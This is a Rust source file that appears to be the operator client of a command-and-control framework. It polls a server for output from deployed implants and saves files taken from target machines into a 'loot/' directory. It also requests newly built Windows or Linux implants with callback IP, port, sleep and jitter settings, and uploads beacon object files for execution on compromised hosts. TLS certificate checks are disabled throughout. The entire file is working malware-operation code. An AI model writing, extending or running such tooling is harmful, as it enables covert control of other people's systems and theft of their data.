use base64::{
    alphabet,
    engine::{self, general_purpose},
    Engine as _,
};
use reqwest::header::{HeaderMap, HeaderName, HeaderValue};
use reqwest::{
    header::{CONTENT_TYPE, USER_AGENT},
    ClientBuilder,
};
use std::{
    error::Error,
    fs::File,
    io::{Read, Write},
};

use crate::ImpInfo;

pub async fn retrieve_all_output_with_polling(
    imp_info: Vec<ImpInfo>,
    token: &str,
    url: &str,
) -> Result<Vec<String>, Box<dyn Error + Send>> {
    let mut outputs = Vec::new();

    for imp in imp_info {
        let session_id = &imp.session; // Assuming ImpInfo has a session field
        match retrieve_all_output(session_id, token, url).await {
            Ok(Some(output)) if !output.is_empty() => {
                let retrieved_output =
                    engine::GeneralPurpose::new(&alphabet::URL_SAFE, general_purpose::NO_PAD)
                        .decode(output.clone())
                        .unwrap();
                let decoded_output = String::from_utf8_lossy(&retrieved_output).to_string();
                //let output = decoded_output.replace("\n", "");
                //if output contains the string "getfile", then we need to grab the last string after spaces, which is still base64 encoded and decode it
                //this works! now I think we will change it to also save the content to a local file - TODONEXT
                if decoded_output.contains("getfile") {
                    //grab the still base64 encoded string from the decoded output
                    let b64output = decoded_output.split_whitespace().last().unwrap();
                    //decode the base64 encoded string
                    let retrieved_output =
                        engine::GeneralPurpose::new(&alphabet::URL_SAFE, general_purpose::NO_PAD)
                            .decode(b64output)
                            .unwrap();
                    //since we have to return a string, once we have saved the content to a new file, then we can just send a string with the
                    // file name and the path to the file, and maybe a success message
                    //first get the file name from the decoded output
                    //i think the filename is going to be the third word in the decoded output
                    let fullfilepath = decoded_output.split_whitespace().nth(2).unwrap();
                    //strip a colon from the beginning of the string
                    //let fullfilepath = fullfilepath.strip_prefix(":").unwrap();
                    //print the full file path to the console
                    //println!("Full file path: {}", fullfilepath);
                    //we need to get just the filename from the fullfilepath
                    let filename = fullfilepath.split(r"\").last().unwrap();
                    //strip the colon from the end of the string
                    let filename = filename.strip_suffix(":").unwrap();
                    //now we need to save the file to the local directory
                    //print the file name to the console
                    //println!("File name: {}", filename);
                    //append loot/ to the filename
                    let filename = "loot/".to_string() + filename;
                    let fileclone = filename.clone();
                    let mut file = File::create(filename).unwrap();
                    file.write_all(&retrieved_output).unwrap();
                    //now we can add the filename to the outputs vector
                    //lets push "File saved to: " + filename + " in the outputs vector
                    let mut file_saved = "File saved to: ".to_string();
                    file_saved.push_str(fileclone.as_str());
                    outputs.push(file_saved);
                    //let b64_decoded_output = String::from_utf8_lossy(&retrieved_output).to_string();
                    //outputs.push(b64_decoded_output);
                } else {
                    outputs.push(decoded_output);
                    //outputs.push(output),
                }
            }
            Ok(None) => {
                // Output not available yet, wait and retry
                // You might want to implement a retry mechanism here
            }
            Err(e) => return Err(e),
            _ => {}
        }
    }

    //println!("outputs: {:?}", outputs);
    let outputs: Vec<String> = outputs.iter().map(|s| s.to_string()).collect();
    //check outputs for presence of double backslashes and replace them with single backslashes
    let outputs: Vec<String> = outputs.iter().map(|s| s.replace(r"\\", r"\")).collect();

    Ok(outputs)
}

pub async fn retrieve_all_output(
    _session_id: &str,
    token: &str,
    url: &str,
) -> Result<Option<String>, Box<dyn Error + Send>> {
    let url = format!("https://{}:8443/retrieve_all_out", url);
    //println!("task_name: {}", task_name);
    //println!("imp_token: {}", session_id);
    //println!("token: {}", token);
    //println!("url: {}", url);

    let client = ClientBuilder::new()
        .danger_accept_invalid_certs(true)
        .build()
        .map_err(|_| {
            Box::new(std::io::Error::new(
                std::io::ErrorKind::Other,
                "Failed to build the client",
            ))
        });

    let mut headers = HeaderMap::new();
    headers.insert(
        HeaderName::from_static("x-token"),
        HeaderValue::from_str(token).map_err(|e| Box::new(e) as Box<dyn Error + Send>)?,
    );

    let client = client.map_err(|e| Box::new(e) as Box<dyn Error + Send>)?;
    let res = client.get(&url).headers(headers).send().await;

    match res {
        Ok(response) => {
            let output = response.text().await.unwrap(); // Unwrap the Result to get the inner String value
                                                         //println!("output: {}", output);
            Ok(Some(output))
        }
        Err(e) => Err(Box::new(e) as Box<dyn Error + Send>),
    }
}

//gonna start putting new commands down here

pub fn read_and_encode(args: Vec<&str>) -> String {
    const CUSTOM_ENGINE: engine::GeneralPurpose =
        engine::GeneralPurpose::new(&alphabet::URL_SAFE, general_purpose::NO_PAD);
    let mut _file_path = "";
    if args.len() > 1 {
        _file_path = args[1];

        let mut file = match File::open(_file_path) {
            Ok(file) => file,
            Err(e) => return format!("Error opening file: {}", e),
        };
        let mut buffer = Vec::new();
        if let Err(e) = file.read_to_end(&mut buffer) {
            return format!("Error reading file: {}", e);
        }
        let content = CUSTOM_ENGINE.encode(&buffer);

        //convert file_path to a string
        let file_path = _file_path.to_string();

        //prepend the filepath to the content
        let content = file_path + " " + &content;

        content
    }
    //else return an error
    else {
        return "Error: No file path provided".to_string();
    }
}
/*
pub fn read_and_send(args: Vec<&str>) -> String {
    const CUSTOM_ENGINE: engine::GeneralPurpose = engine::GeneralPurpose::new(&alphabet::STANDARD_NO_PAD, general_purpose::NO_PAD);
    let mut _file_path = "";
    if args.len() > 1 {
        _file_path = args[1];

        let mut file = match File::open(_file_path) {
            Ok(file) => file,
            Err(e) => return format!("Error opening file: {}", e),
        };
        let mut buffer = Vec::new();
        if let Err(e) = file.read_to_end(&mut buffer) {
            return format!("Error reading file: {}", e);
        }
        let content = String::from_utf8_lossy(&buffer);

        //println!("content: {}", content);

        //convert file_path to a string
        let file_path = _file_path.to_string();

        //prepend the filepath to the content
        let content = file_path + " " + &content;

        content
    }
    //else return an error
    else {
        return "Error: No file path provided".to_string();
    }

}
*/
//function to hit our server api build_imp for generating a new imp
use tokio::fs::File as tokiofile;
use tokio::io::AsyncWriteExt;

pub async fn build(
    token: &str,
    url: &str,
    target: &str,
    target_ip: &str,
    target_port: &str,
    tsleep: &str,
    format: &str,
    jitter: &str,
) -> Result<String, Box<dyn std::error::Error + Send + Sync>> {
    let url = format!("https://{}:8443/build_imp", url);
    let client = ClientBuilder::new()
        .danger_accept_invalid_certs(true)
        .build()
        .map_err(|_| {
            Box::new(std::io::Error::new(
                std::io::ErrorKind::Other,
                "Failed to build the client",
            ))
        })?;

    let mut headers = HeaderMap::new();
    headers.insert(
        HeaderName::from_static("x-token"),
        HeaderValue::from_str(token).map_err(|e| Box::new(e) as Box<dyn Error + Send + Sync>)?,
    );

    headers.insert(
        HeaderName::from_static("x-target"),
        HeaderValue::from_str(target).map_err(|e| Box::new(e) as Box<dyn Error + Send + Sync>)?,
    );

    //lets also specify a target ip and target port for the imp, which the server will declare as environment variables
    //also sleep as tsleep
    headers.insert(
        HeaderName::from_static("x-target-ip"),
        HeaderValue::from_str(target_ip)
            .map_err(|e| Box::new(e) as Box<dyn Error + Send + Sync>)?,
    );

    headers.insert(
        HeaderName::from_static("x-target-port"),
        HeaderValue::from_str(target_port)
            .map_err(|e| Box::new(e) as Box<dyn Error + Send + Sync>)?,
    );

    headers.insert(
        HeaderName::from_static("x-tsleep"),
        HeaderValue::from_str(tsleep).map_err(|e| Box::new(e) as Box<dyn Error + Send + Sync>)?,
    );
    headers.insert(
        HeaderName::from_static("x-format"),
        HeaderValue::from_str(format).map_err(|e| Box::new(e) as Box<dyn Error + Send + Sync>)?,
    );
    headers.insert(
        HeaderName::from_static("x-jitter"),
        HeaderValue::from_str(jitter).map_err(|e| Box::new(e) as Box<dyn Error + Send + Sync>)?,
    );

    let res = client
        .post(&url)
        .headers(headers)
        .send()
        .await
        .map_err(|e| Box::new(e) as Box<dyn Error + Send + Sync>)?;

    if !res.status().is_success() {
        return Err(Box::new(std::io::Error::new(
            std::io::ErrorKind::Other,
            format!("Server returned error: {}", res.status()),
        )));
    }

    let bytes = res
        .bytes()
        .await
        .map_err(|e| Box::new(e) as Box<dyn Error + Send + Sync + 'static>)?;

    // Write the bytes to a file
    //the file format depends on the target
    //if the target is "windows", then the file format is .exe
    //if the target is "linux", then the file format is .elf, but just don't add the file extension if linux
    //there is no mac right now
    //check if the target is windows or linux and add the appropriate file extension

    //if the target is windows, then add the .exe or .dll file extension
    //check format and add the appropriate file extension
    //format will be bin for exe and dll for dll
    //if the format is bin, then add the .exe file extension
    //if the format is dll, then add the .dll file extension
    //TODO: need to add something to the names. in testing, if windows.exe is already running, then the new windows.exe will not overwrite the old one
    //TODO: need to add matching for "windows_noldr" and other builds
    let target = if target.contains("windows") {
        match format {
            "exe" => format!("{}.exe", target),
            "dll" => format!("{}.dll", target),
            "raw" => format!("{}.bin", target),
            _ => format!("{}.exe", target),
        }
    } else {
        target.to_string()
    };

    //if the target is linux, then add the .elf file extension
    let target = if target == "linux" {
        format!("{}", target)
    } else {
        target.to_string()
    };

    let mut file = tokiofile::create(format!("{}", target))
        .await
        .map_err(|e| Box::new(e) as Box<dyn Error + Send + Sync>)?;

    file.write_all(&bytes)
        .await
        .map_err(|e| Box::new(e) as Box<dyn Error + Send + Sync>)?;

    Ok(format!(
        "File received and written to {} successfully",
        target
    ))
}

pub async fn send_bof(file_path: &str, url: &str, token: &str) -> Result<(), Box<dyn std::error::Error>> {
    //println!("file_path: {}", file_path);
    //println!("url: {}", url);
    //println!("token: {}", token);
    // Open the file
    let mut file = File::open(file_path)?;
    let url = format!("https://{}:8443/bofload", url);

    // Read the file's content into a vector
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;

    //strip the file_path of the file name and just get the file name, for the header
    //since slashes are always problematic, how else can we grab just the filename from the path
    use std::path::Path;
    let path = Path::new(&file_path);
    let filename = match path.file_name() {
        Some(name) => match name.to_str() {
            Some(str_name) => str_name,
            None => {
                return Err(Box::new(std::io::Error::new(
                    std::io::ErrorKind::InvalidData,
                    "File name is not valid Unicode.",
                )));
            }
        },
        None => {
            return Err(Box::new(std::io::Error::new(
                std::io::ErrorKind::InvalidInput,
                "Path does not have a file name.",
            )));
        }
    };

    //println!("filename: {}", filename);

    // Create a HeaderMap and add the filename header
    let mut headers = HeaderMap::new();
    headers.insert("X-Filename", HeaderValue::from_str(filename)?);
    headers.insert(
        CONTENT_TYPE,
        HeaderValue::from_static("application/octet-stream"),
    );
    headers.insert(USER_AGENT, HeaderValue::from_static("reqwest"));
    // Add the X-Token header
    headers.insert("X-Token", HeaderValue::from_str(token)?);

    // Send a POST request with the binary data
    let client = ClientBuilder::new()
        .danger_accept_invalid_certs(true)
        .build()
        .map_err(|_| {
            Box::new(std::io::Error::new(
                std::io::ErrorKind::Other,
                "Failed to build the client",
            ))
        })?;
    let _res = client
        .post(url)
        .headers(headers)
        .body(buffer)
        .send()
        .await?;

    // Check the status of the response
    /*
    if res.status().is_success() {
        //println!("File uploaded successfully");
        //this shouldn't be necessary becausse if the file is uploaded successfully, then the server will return a success message
    } else {
        println!("Failed to upload file: {}", res.status());
    }*/

    Ok(())
}

//function to send binary data to the server
//this is for uploading boff files such as whoami.x64.o
